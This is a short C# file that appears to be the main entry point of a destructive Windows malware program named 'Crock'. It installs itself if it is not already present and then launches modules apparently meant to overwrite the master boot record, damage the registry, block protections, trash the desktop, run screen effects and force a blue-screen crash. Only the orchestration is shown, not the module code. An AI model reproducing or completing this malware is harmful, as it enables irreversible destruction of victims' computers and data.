using System.Threading;

namespace Crock
{
    internal static class Program
    {
        // Start all modules
        private static void UseExp()
        {
            Protect.Block();
            Killer.MBR();
            Addition.RegFun();
            var rule = new Rules();
            new Thread(() => rule.ShowDialog()).Start();
            new Thread(Addition.TrashDesktop).Start();
            new Thread(Effect.GDI_payloads).Start();
            Killer.RegFuck();
            Killer.BSOD();
        }

        private static void Main()
        {
            if (!Addition.IsInstalledAr())
                Addition.InstallAr(); 
            
            UseExp();
        }
    }
}
